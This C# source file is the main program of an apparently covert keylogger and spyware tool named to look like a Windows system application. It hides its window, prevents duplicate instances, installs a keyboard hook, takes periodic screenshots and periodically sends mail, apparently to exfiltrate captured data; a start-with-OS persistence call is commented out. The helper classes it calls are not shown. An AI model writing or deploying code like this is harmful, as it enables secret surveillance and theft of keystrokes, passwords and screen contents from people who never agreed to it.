using System.Threading;
using Windows_System_Application.source;

namespace Windows_System_Application
{
    internal class Program
    {
        #region Timer
        static int interval = 1;
        static void StartTimmer()
        {
            Thread thread = new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(1);

                    if (interval % Capture.captureTime == 0)
                        Capture.CaptureScreen();

                    if (interval % Mail.mailTime == 0)
                        Mail.SendMail();

                    interval++;

                    if (interval >= 1000000)
                        interval = 0;
                }
            });
            thread.IsBackground = true;
            thread.Start();
        }
        #endregion

        static void Main(string[] args)
        {
            //check application is run
            if (System.Diagnostics.Process.GetProcessesByName(System.IO.Path.GetFileNameWithoutExtension(System.Reflection.Assembly.GetEntryAssembly().Location)).Length > 1)
            {
                return;
            }

            //StartWithOS();
            Windows.HideWindow();

            StartTimmer();
            HookKeyBoard.run();

        }
    }
}
